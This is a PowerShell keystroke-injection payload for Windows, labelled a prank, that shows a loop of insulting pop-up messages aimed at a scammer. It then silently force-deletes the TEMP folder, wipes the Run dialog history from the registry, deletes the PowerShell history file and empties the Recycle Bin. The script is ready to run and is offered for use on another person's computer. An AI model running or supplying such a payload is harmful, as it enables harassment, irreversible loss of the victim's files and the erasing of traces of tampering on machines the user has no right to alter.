                 
#                                  |  ___                           _           _              _                             _     __          
# Title        : Rage-PopUps       | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _    _   _     __| |   / _ \     ___     __ _    _   _ 
# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |  \  \/ /   / _  |  | | | |   / _ \   / _` |  \  \/ /
# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |   >   <   | (_| |  | |_| |  | (_    | (_| |   >   <
# Category     : Prank             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |  /_ /\_\   \____|   \___/    \___/   \__,_|  /_ /\_\
# Target       : Windows 7,10,11   |                                                                   |___/ 
# Mode         : HID               |                                                  
#                                  |  My crime is that of curiosity               
#                                  |   and yea curiosity killed the cat                                                                                                            
#                                  |    but satisfaction brought him back              

#>

#------------------------------------------------------------------------------------------------------------------------------------

Add-Type -AssemblyName System.Windows.Forms

$cycles = 3

$msgs = @(
"Are all scammers as dumb as you?"
"Is the pay worth being this big of a loser?"
"Do your parents know what you do for a living?"
"Does you boss know much much you suck at this job?"
)

for ($i=1; $i -le $cycles; $i++) {

Foreach ($msg in $msgs) {
[System.Windows.Forms.MessageBox]::Show($msg , "You're-a-Loser.exe" , 4 , 'Question')
}
}

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue


reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f


Remove-Item (Get-PSreadlineOption).HistorySavePath


Clear-RecycleBin -Force -ErrorAction SilentlyContinue
